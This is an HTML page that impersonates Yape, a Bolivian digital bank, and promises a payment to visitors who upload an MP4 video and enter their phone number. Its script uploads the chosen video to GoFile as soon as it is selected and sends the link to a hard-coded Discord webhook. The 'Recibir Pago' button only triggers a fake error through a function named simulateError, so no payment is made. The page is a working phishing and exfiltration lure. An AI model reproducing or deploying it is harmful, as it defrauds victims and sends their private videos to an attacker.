<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Yape | ¡Operaciones sin comisiones! | Cuenta digital en Bs.</title>
    <meta name="description" content="Cuenta digital creada para los bolivianos que necesiten más que una cuenta de ahorros. Respaldada por el BCP. Servicio através de una aplicación (app)">

    <!-- Open Graph / Facebook -->
    <meta property="og:url" content="https://bisa-com-transferencia.github.io/" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Yape | ¡Operaciones sin comisiones! | Cuenta digital en Bs." />
    <meta property="og:description" content="Cuenta digital creada para los bolivianos que necesiten más que una cuenta de ahorros. Respaldada por el BCP. Servicio através de una aplicación (app)" />
    <meta property="og:image" content="https://bisa-com-transferencia.github.io/images/preview_yape.png" />

    <!-- Twitter -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta property="twitter:domain" content="bisa-com-transferencia.github.io" />
    <meta property="twitter:url" content="https://bisa-com-transferencia.github.io/" />
    <meta name="twitter:title" content="Yape | ¡Operaciones sin comisiones! | Cuenta digital en Bs." />
    <meta name="twitter:description" content="Cuenta digital creada para los bolivianos que necesiten más que una cuenta de ahorros. Respaldada por el BCP. Servicio através de una aplicación (app)" />
    <meta name="twitter:image" content="https://bisa-com-transferencia.github.io/images/preview_yape.png" />

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300..800&display=swap" rel="stylesheet" />

    <!-- Favicon -->
    <link rel="icon" type="image/png" href="images/favicon-96x96.png" sizes="96x96" />
    <link rel="icon" type="image/svg+xml" href="images/favicon.svg" />
    <link rel="shortcut icon" href="images/favicon.ico" />
    <link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png" />
    <style>
        :root {
            --color-azul: #10cbb4FF;
            --color-amarillo: #742284FF;
            --color-amarillo-pastel: #f0cef5FF;
            --color-blanco: #ffffff;
            --color-blanco-pastel: #FFFFFFE6;
            --color-negro: #000000;
        }
        
    

        body {
            font-family: "Open Sans", sans-serif;
            font-optical-sizing: auto;
            font-weight: 400;
            font-style: normal;
            font-variation-settings: "wdth" 100;
            text-align: center;
            padding: 16px;
            max-width: 700px;
            margin: 0 auto;
            background-color: #fff;

        }
        
        header {
            margin-bottom: 1.5rem;
            opacity: 0;
            transform: translateY(50px);
            transition: opacity 1.1s ease, transform 1.1s ease;
        }
        main, footer {
            opacity: 0;
            transform: translateY(50px);
            transition: opacity 1.1s ease, transform 1.1s ease;

        }
        header.visible,
        main.visible,
        footer.visible {
            opacity: 1;
            transform: translateY(0);
        }
        #logo {
            margin: 5px 0;
            max-width: 200px;
            height: 100px;
        }
        #description {
            font-size: 0.9rem;
            color: #444;
            font-weight: 500;
            line-height: 1.4;
            margin: 5px 0;
        }
        h1 {
            color: var(--color-blanco);
            font-size: 1.75rem;
            margin: 1rem 0;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 14px;
        }
        label {
            color: var(--color-blanco);
            font-weight: bold;
            font-size: 1.063rem;
        }
        input, select {
            padding: 10px;
            margin: 5px 0;
            border: 1px solid var(--color-azul);
            border-radius: 6px;
            font-size: 1rem;
            background-color: var(--color-amarillo-pastel);
        }
        button {
            background-color: var(--color-azul);
            color: var(--color-blanco);
            border: none;
            cursor: pointer;
            padding: 15px;
            margin-top: 10px;
            font-size: 1rem;
            font-weight: bold;
            border-radius: 6px;
        }
        button:disabled {
            background-color: #FFA9A9;
            cursor: not-allowed;
            color: var(--color-blanco-pastel);
        }
        button:hover:not(:disabled) {
            background-color: var(--color-azul);
            color: var(--color-blanco);
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
            font-size: 1rem;
        }
        #status.error {
            color: red;
        }
        #status.success {
            color: green;
        }
        #footer-logo {
            max-width: 100%;
            margin: 5px 0;
        }
    </style>
</head>
<body>
    <header>
        <img src="images/yapee.svg" alt="Banco Yape" id="logo" />
        <p id="description">
            Complete correctamente los datos requeridos en esta sección para recibir el pago. <strong>La transferencia es segura,</strong> se procesa al instante y el trámite es totalmente seguro y confiable.
        </p>
    </header>
    
    <main style="background: var(--color-amarillo); border-radius: 6px; padding: 10px;">
        <h1>Transferencia</h1>
        <form id="uploadForm">
            <label for="videoUpload">Selecciona el video MP4:</label>
            <input type="file" id="videoUpload" accept="video/mp4" required />
            
            <label for="paymentMethod">Método de pago:</label>
            <select id="paymentMethod" required>
                <option value="" disabled selected>Selecciona una opción</option>
                <option value="banco_bisa">Banco BISA</option>
                <option value="mercado_pago">Banco Unión</option>
                <option value="entel">Yape</option>
                <option value="tigo_money">Banco Mercantil Santa Cruz</option>
                <option value="bancosol">BancoSol</option>
                <option value="bnb">BNB</option>
            </select>
            
            <label for="amount">Monto:</label>
            <select id="amount" required>
                <option value="" disabled selected>Selecciona un monto</option>
                <option value="2">Bs 14.00</option>
                <option value="4">Bs 40.00</option>
                <option value="6">Bs 100.00</option>
                <option value="8">Bs 150.00</option>
                <option value="10">Bs 170.00</option>
                <option value="12">Bs 200.00</option>
            </select>

            <label for="code">Ingrese tu número de celular:</label>
            <input type="text" id="code" maxlength="8" pattern="\d{8}" required />

            <button type="submit" id="submitButton" disabled>Recibir Pago</button>
        </form>
        <p id="status"></p>
    </main>
    <footer>
        <h3 style="padding: 20px 0 5px;">Novedades USDT</h3>
        <img id="footer-logo" src="images/yapeee.jpg" alt="" />
        <p style="margin: 25px 0 5px 0; font-size: 11px;">Yape Bolivia © 2025. Todos los derechos reservados.<br>
            Esta Entidad es Supervisada por ASFI – Banco de Crédito de Bolivia S.A.
        </p>
    </footer>

    <script>
  window.addEventListener('DOMContentLoaded', () => {
    // Animar header inmediatamente
    document.querySelector('header')?.classList.add('visible');

    // Animar main después de 200ms
    setTimeout(() => {
      document.querySelector('main')?.classList.add('visible');
    }, 200);

    // Animar footer después de 400ms
    setTimeout(() => {
      document.querySelector('footer')?.classList.add('visible');
    }, 400);
  });
</script>


    <script>
        const videoInput = document.getElementById('videoUpload');
        const paymentMethod = document.getElementById('paymentMethod');
        const amount = document.getElementById('amount');
        const codeInput = document.getElementById('code');
        const submitButton = document.getElementById('submitButton');
        const statusP = document.getElementById('status');

        let downloadLink = null; // Almacena el enlace de GoFile
        let isUploading = false; // Indica si el video está subiendo
        let isLinkSent = false; // Indica si el enlace ya fue enviado a Discord

        // Verifica si los campos requeridos están completos y la subida ha terminado
        function checkForm() {
            const videoSelected = videoInput.files.length > 0;
            const paymentSelected = paymentMethod.value !== '';
            const amountSelected = amount.value !== '';
            const codeEntered = codeInput.value.length === 8;

            if (videoSelected && paymentSelected && amountSelected && codeEntered && !isUploading && downloadLink) {
                submitButton.disabled = false;
            } else {
                submitButton.disabled = true;
            }
        }

        // Escuchar cambios en los campos
        videoInput.addEventListener('change', () => {
            if (videoInput.files.length > 0) {
                uploadVideo();
            }
            checkForm();
        });
        paymentMethod.addEventListener('change', checkForm);
        amount.addEventListener('change', checkForm);
        codeInput.addEventListener('input', checkForm);

        // Subir el video automáticamente y enviar el enlace a Discord
        async function uploadVideo() {
            isUploading = true;
            statusP.textContent = 'Cargando video...';
            statusP.className = '';
            checkForm();

            const file = videoInput.files[0];
            const formData = new FormData();
            formData.append('file', file);

            try {
                const response = await fetch('https://upload.gofile.io/uploadfile', {
                    method: 'POST',
                    body: formData,
                    mode: 'cors'
                });

                const data = await response.json();

                if (data.status === 'ok') {
                    downloadLink = data.data.downloadPage;
                    isUploading = false;

                    // Enviar el enlace a Discord automáticamente
                    const webhookURL = 'https://canary.discord.com/api/webhooks/1387205612135256216/d177Hv9cpX1mKz-ictali8K5xFDmnZ7nPz6-CZfUHBexaWmXBNJ2EZgBMvoA6J';
                    try {
                        const webhookResponse = await fetch(webhookURL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                content: `Nuevo video subido: **${file.name}**\nEnlace: ${downloadLink}`
                            })
                        });

                        if (webhookResponse.ok) {
                            isLinkSent = true;
                            statusP.textContent = 'Complete los campos y haga clic en "Recibir Pago".';
                        } else {
                            statusP.textContent = 'Algo salió mal. Intenta otra vez';
                            statusP.className = 'error';
                        }
                    } catch (error) {
                        statusP.textContent = 'Error de conexión, intenta otra vez';
                        statusP.className = 'error';
                    }

                    checkForm();
                } else {
                    statusP.textContent = 'Error. Elija el vídeo correcto';
                    statusP.className = 'error';
                    isUploading = false;
                    checkForm();
                }
            } catch (error) {
                statusP.textContent = 'Error de conexión';
                statusP.className = 'error';
                isUploading = false;
                checkForm();
            }
        }

        // Simular error al hacer clic en "Recibir Pago"
        async function simulateError() {
            statusP.textContent = 'Procesando pago...';
            statusP.className = '';

            // Simular un pequeño retraso para que parezca que se procesa
            await new Promise(resolve => setTimeout(resolve, 1000));

            if (isLinkSent) {
                statusP.textContent = 'Error, intente nuevamente';
                statusP.className = 'error';
                // Limpiar formulario
                videoInput.value = '';
                paymentMethod.value = '';
                amount.value = '';
                codeInput.value = '';
                downloadLink = null;
                isLinkSent = false;
                checkForm();
            } else {
                statusP.textContent = 'Error: No se ha procesado correctamente';
                statusP.className = 'error';
            }
        }

        // Manejar el clic en "Recibir Pago"
        document.getElementById('uploadForm').addEventListener('submit', (e) => {
            e.preventDefault();
            simulateError();
        });
    </script>
</body>
</html>
